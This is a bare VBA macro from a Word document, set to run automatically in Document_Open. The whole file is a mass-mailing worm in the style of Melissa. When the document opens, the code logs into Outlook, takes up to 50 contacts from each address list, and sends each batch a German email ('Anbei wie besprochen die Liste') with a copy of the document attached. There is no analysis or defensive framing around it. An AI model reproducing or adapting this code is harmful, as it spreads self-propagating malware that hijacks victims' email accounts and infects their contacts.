   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   Private Sub Document_Open()
   Dim outl, mpnm, ofs
   Set outl = CreateObject("Outlook.Application")
   Set mpnm = outl.GetNameSpace("MAPI")
   mpnm.Logon "profile", "password"
   For y = 1 To mpnm.AddressLists.Count
   Set adbk = mpnm.AddressLists(y)
   x = 1
   Set ofs = outl.CreateItem(0)
   For oo = 1 To adbk.AddressEntries.Count
   td = adbk.AddressEntries(x)
   ofs.Recipients.Add td
   x = x + 1
   If x > 50 Then oo = adbk.AddressEntries.Count
   Next oo
   ofs.Subject = "Nachricht von " & Application.UserName
   ofs.Body = "Anbei wie besprochen die Liste"
   atti = ActiveDocument.FullName
   atti = Mid(atti, 1, Len(atti) - 4)
   atti = atti & "_2.doc"
   ofs.Attachments.Add atti
   ofs.Send
   td = ""
   Next y
   mpnm.Logoff

   End Sub
